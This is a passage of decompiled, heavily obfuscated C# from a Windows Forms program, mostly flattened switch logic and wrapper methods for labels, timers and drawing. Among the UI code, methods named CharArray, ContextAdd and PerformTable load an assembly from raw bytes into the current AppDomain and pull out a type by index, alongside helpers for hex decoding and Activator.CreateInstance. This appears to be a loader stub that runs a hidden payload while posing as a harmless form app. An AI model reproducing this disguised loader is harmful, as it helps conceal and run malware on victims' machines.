					num = (int)(num2 * 2084836765) ^ -1284252714;
					continue;
				case 8u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)(num2 * 879286407) ^ -1911888874;
					continue;
				case 7u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = (int)((num2 * 312773566) ^ 0x441A21D);
					continue;
				case 6u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1322289127) ^ 0x1EF7AE72);
					continue;
				case 5u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -1074886214) ^ -1259776569;
					continue;
				case 4u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)(num2 * 979432026) ^ -2127304877;
					continue;
				case 3u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -1096054155) ^ 0x76B34A0F;
					continue;
				case 2u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -1310755738) ^ -102143124;
					continue;
				case 1u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -1982632511) ^ 0x7B6CA7F8;
					continue;
				case 0u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = (int)(num2 * 837120475) ^ -1278520720;
					continue;
				default:
					return;
				case 88u:
					break;
				case 78u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = default(Assembly);
		while (true)
		{
			int num = -206446733;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC7CE1EB0u) % 4u)
				{
				case 3u:
					q = ContextAdd(Level);
					num = (int)((num2 * 1506917093) ^ 0x1A28D9E2);
					continue;
				case 1u:
					PerformTable(q);
					num = (int)(num2 * 2129511822) ^ -132017240;
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 399343378;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x123AB5D5u) % 3u)
				{
				case 2u:
					goto IL_0003;
				case 0u:
					break;
				default:
					return result;
				}
				break;
				IL_0003:
				result = Form1.smethod_94(Form1.smethod_93(), Position);
				num = ((int)num2 * -372630821) ^ 0x7BA86476;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
